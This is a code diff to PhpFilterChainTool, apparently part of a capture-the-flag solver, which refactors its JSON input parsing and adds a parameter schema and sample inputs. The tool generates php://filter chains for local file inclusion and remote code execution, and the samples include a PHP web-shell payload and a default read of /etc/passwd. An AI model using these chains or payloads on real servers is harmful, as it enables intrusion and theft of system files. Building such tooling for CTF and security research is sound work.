@@ -8,8 +8,9 @@ and RCE (write arbitrary PHP code). This was THE dominant PHP technique in
 Ref: Synacktiv "PHP filter chains" research, N1CTF 2023 Laravel.
 """
 
-import json
 from typing import Dict, List
+
+from ctf_solver.tools.core import parse_json_input
 
 
 class PhpFilterChainTool:
@@ -46,6 +47,30 @@ class PhpFilterChainTool:
         "For rce: optional 'payload' (PHP code to inject). For oracle: optional 'file' "
         "(target file). Returns ready-to-use php://filter chains for LFI exploitation."
     )
+    parameters_schema = {
+        "type": "object",
+        "properties": {
+            "operation": {
+                "type": "string",
+                "enum": ["file_read", "rce", "oracle", "reference"],
+            },
+            "file": {"type": "string", "default": "/etc/passwd"},
+            "encoding": {
+                "type": "string",
+                "enum": ["base64", "rot13", "utf"],
+                "default": "base64",
+            },
+            "payload": {"type": "string"},
+            "wrappers": {"type": "array"},
+        },
+        "required": ["operation"],
+        "additionalProperties": False,
+    }
+    samples = [
+        {"operation": "file_read", "file": "/etc/passwd"},
+        {"operation": "rce", "payload": "<?php system($_GET['c']); ?>"},
+        {"operation": "reference"},
+    ]
 
     VALID_OPERATIONS = {"file_read", "rce", "oracle", "reference"}
 
@@ -278,11 +303,9 @@ class PhpFilterChainTool:
         return base64.b64encode(full.encode()).decode()
 
     def use(self, tool_input: str) -> str:
-        try:
-            data = json.loads(tool_input) if tool_input else {}
-        except json.JSONDecodeError as exc:
-            return f"[PhpFilterChainTool] Error: Invalid JSON. {exc}"
-
+        data, err = parse_json_input(tool_input, "PhpFilterChainTool")
+        if err:
+            return err
         operation = (data.get("operation") or "").strip().lower()
         if not operation:
             return (
